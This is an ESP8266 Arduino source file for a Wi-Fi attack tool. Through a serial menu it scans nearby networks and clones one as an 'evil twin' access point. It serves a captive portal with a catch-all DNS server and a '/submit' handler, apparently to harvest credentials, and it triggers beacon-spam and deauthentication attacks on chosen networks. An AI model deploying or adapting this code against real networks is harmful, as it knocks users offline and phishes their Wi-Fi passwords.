#include <ESP8266WiFi.h>
#include "View.h"
#include "WebPortal.h"
#include "NetworkList.h"
#include "BeaconSpam.h"
#include "Deauther.h"

IPAddress local_IP(192,168,4,22);
IPAddress subnet(255,255,255,0);

ESP8266WebServer server(DEFAULT_PORT);
DNSServer dnsServer;

NetworkList networks;

String custom_AP_SSID;
bool apStarted = false; // to see if there is a point running
bool internetConnection = false;
bool attacking = false; //if any attacks are happening
bool beaconSpamAttack = false;
bool deauthAttack = false;
uint8_t intInput = 0;

void setup() {

    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(); // Disconnect from any previously connected network

    delay(1000); // Wait for the module to disconnect

    Serial.begin(115200);
    Serial.flush();


    Serial.println("\n");//need online mode for firebase
    Serial.println("1: Online Mode");
    Serial.println("2: Offline Mode");
    Serial.print("Enter Mode: ");
    
    while (!Serial.available()){}
    View::getIntInput(intInput);
    internetConnection = intInput == 1;

    if(internetConnection){
        //connecting to internet
        Serial.println("Connecting to Internet...");

        WiFi.begin(HOST_SSID, HOST_PASSWORD);
        while (WiFi.status() != WL_CONNECTED){
            Serial.println(".");
            delay(1000);
        }
        Serial.println("Connected To Internet");

    }
    delay(10);
}


void loop(){
    mainMenu();
    delay(10);
}

void mainMenu(){
    if (!attacking){

        View::printInstruction();
        uint8_t menuInput=0;
        View::getIntInput(menuInput);

        switch (menuInput){
            case 1:
                findNewNetworks();
                break;
            case 2:
                evilTwin();
                break;
            case 3:
                createCustomAP();
                attacking = true;
                break;
            case 4:
                if(beaconSpamSetup()){
                    beaconSpamAttack = true;
                    attacking = true;
                }
                break;
            case 5:
                if(deauthSetup()){
                    deauthAttack = true;
                    attacking = true;
                }
                break;
            case 6: // control attacks
              break;
            default:
                Serial.println("Enter a Valid Answer: ");
                View::printInstruction();
                break;
        }
    } else{
        if(beaconSpamAttack) handleBeaconSpam();
        if(deauthAttack) handleDeauthAttack();

        if(apStarted){
            dnsServer.processNextRequest();
            server.handleClient();
        }
    }
}

uint8_t getNetworkIndex(){
    if(networks.getSize() == 0){
        Serial.println("No networks observed.");
        return -1;
    }

    Serial.print("\nWhich network # to mimic: ");
    uint8_t networkNum;
    View::getIntInput(networkNum);
    Serial.printf("\nChosing network #%d\n", networkNum);

    if(networkNum >= 0 && networkNum <= networks.getSize()){
        return networkNum -1;
    }else{
        Serial.println("Invalid network number.");
    }
    return -1;
}

void findNewNetworks(){
    Serial.println("\nScanning for available networks:");

    uint8_t newNumNetworks = WiFi.scanNetworks();
    String SSID;
    String BSSIDstr;
    uint8_t BSSID[6];
    float RSSI;
    uint8_t channel;

    for (uint8_t i = 0; i < newNumNetworks; i++){
        SSID = WiFi.SSID(i);
        BSSIDstr = WiFi.BSSIDstr(i);
        memcpy(BSSID, WiFi.BSSID(i), 6);
        RSSI = WiFi.RSSI(i);
        channel = WiFi.channel(i);

        networks.addNetwork(SSID, BSSIDstr, BSSID, RSSI, channel);
   
    }
    networks.printNetworks();
}

void evilTwin(){
    uint8_t networkNum = getNetworkIndex();
    if(networkNum != -1){
        custom_AP_SSID = *networks.getSSID(networkNum);
        attacking = createAP();
    }
}

void createCustomAP(){
    Serial.print("Enter custom SSID: ");
    View::getStrInput(custom_AP_SSID);
    attacking = createAP();
}

bool createAP(){
    Serial.print("Creating network: ");
    Serial.println(custom_AP_SSID);
    
    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
        Serial.println("Failed to configure AP");
        return false;
    }
    
    //WiFi.softAP(custom_AP_SSID, AP_PASSWORD,1, false, 4)
    if (!WiFi.softAP(custom_AP_SSID)) {
        Serial.println("Failed to start AP");
        return false;
    }

    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
        Serial.println("Failed to start DNS Server");
        return false;
    }

    delay(500);

    Serial.println("\nHTTP server started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    server.onNotFound([]() {
        WebPortal::handleConnect();
    });

    server.on("/submit", []() {
        WebPortal::handleSubmit();
    });
    //server.onNotFound(handleNotFound);
    server.begin();
    apStarted = true;
    
    return true;
}

void handleBeaconSpam(){
    beaconSpam();
}

void handleDeauthAttack(){
    uint8_t networkNum = getNetworkIndex();
    if(networkNum != -1){
        deauthNetwork(networks.getChannel(networkNum), networks.getBSSID(networkNum));
    }
}